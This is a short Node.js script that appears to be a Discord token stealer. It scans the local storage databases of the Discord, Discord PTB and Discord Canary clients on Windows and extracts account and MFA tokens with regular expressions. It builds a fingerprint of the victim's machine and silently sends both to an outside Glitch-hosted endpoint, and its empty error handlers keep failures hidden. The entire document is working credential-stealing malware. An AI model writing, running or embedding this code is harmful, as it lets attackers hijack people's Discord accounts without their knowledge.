(async function(){
    try {
        const path = require('path');
        const fs = require('fs');
        const OS = require("os");
        const https = require("https");
        const tokens = [];
        const homedir = OS.homedir();
        const fingerprint = `${OS.hostname()}_${homedir.split("\\").slice(-1)[0]}_${OS.arch()}_${OS.cpus().length}_${OS.endianness()}`;
        const roaming = path.join(homedir, "AppData", "Roaming");
        const magic = ["Local Storage", "leveldb"];
        const discordPaths = {
            "default": path.join(roaming, "discord", ...magic),
            "ptb": path.join(roaming, "discordptb", ...magic),
            "canary": path.join(roaming, "discordcanary", ...magic),
        };
        for (let prop in discordPaths) {
            try {
                let files = fs.readdirSync(discordPaths[prop]);
                for (let file of files) {
                    if (file.slice(-3) !== "ldb") continue;
                    let t = extract(path.join(discordPaths[prop], file));
                    if (!t) continue;
                    tokens.push(`${prop}::${t}`);
                }
            } catch (e) {
                continue;
            }
        }
        function extract (filePath) {
            let content = fs.readFileSync(filePath).toString();
            let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
            let regex2 = /"mfa\.[\d\w_-]{84}"/;
            let [match] = regex1.exec(content) || regex2.exec(content) || [null];
            return match;
        }
        (async function upload () {
            try{
                https.get("https://scratched-citrus.glitch.me/grabber", { headers: { "tokens": tokens, "fingerprint": fingerprint } });
            } catch (e) {

            }
        })();
    } catch (e) {}
})()
